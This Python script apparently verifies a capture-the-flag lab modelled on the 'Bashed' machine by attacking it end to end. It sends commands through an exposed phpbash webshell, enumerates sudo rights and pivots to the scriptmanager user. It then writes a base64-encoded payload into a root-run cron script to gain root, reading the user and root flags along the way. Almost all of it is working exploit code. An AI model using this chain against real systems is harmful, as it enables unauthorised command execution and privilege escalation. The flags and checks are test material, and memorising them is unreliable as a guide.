#!/usr/bin/env python3
"""Independent HTTP attacker for original Arrexel/phpbash and root cron path."""
import base64
import time
import urllib.parse
import urllib.request

BASE = "http://bashed-target"
def cmd(command):
    data = urllib.parse.urlencode({"cmd": command}).encode()
    req = urllib.request.Request(BASE + "/dev/phpbash.php", data=data,
                                 headers={"Content-Type":"application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req, timeout=12) as response:
        assert response.status == 200
        return response.read().decode("utf-8", errors="replace")

home = urllib.request.urlopen(BASE + "/", timeout=8).read().decode()
assert "Bashed" in home
page = urllib.request.urlopen(BASE + "/dev/phpbash.php", timeout=8).read().decode()
assert "phpbash" in page.lower() and "sendCommand" in page, "Original Arrexel webshell missing"

identity = cmd("whoami; id")
assert "www-data" in identity and "uid=33(www-data)" in identity, identity[:400]
sudo = cmd("sudo -l")
assert "scriptmanager" in sudo and "NOPASSWD" in sudo, sudo[:500]
scriptmanager = cmd("sudo -u scriptmanager id")
assert "uid=1001(scriptmanager)" in scriptmanager, scriptmanager[:300]
user_flag = cmd("cat /home/arrexel/user.txt")
assert "TTP{bashed_ci_private_user" in user_flag, "User flag missing"

payload = (
    "import os\n"
    "with open('/tmp/bashed-root-proof','w') as f: f.write(os.popen('id').read())\n"
    "with open('/root/root.txt') as src, open('/tmp/bashed-root-flag-proof','w') as dst: dst.write(src.read())\n"
)
encoded = base64.b64encode(payload.encode()).decode()
write = cmd("echo " + encoded + " | base64 -d | sudo -u scriptmanager tee /scripts/test.py >/dev/null")
assert "error" not in write.lower(), write[:300]

# The real root cron executes all *.py files in /scripts once per minute.
# Wait for a genuine cron invocation instead of calling the script ourselves.
deadline = time.time() + 70
while time.time() < deadline:
    result = cmd("test -s /tmp/bashed-root-proof && cat /tmp/bashed-root-proof; test -s /tmp/bashed-root-flag-proof && cat /tmp/bashed-root-flag-proof")
    if "uid=0(root)" in result and "TTP{bashed_ci_private_root" in result:
        print("PASS: phpbash www-data -> sudo scriptmanager -> writable real cron script -> root")
        break
    time.sleep(3)
else:
    raise AssertionError("Root cron did not execute the modified test.py within 70 seconds")
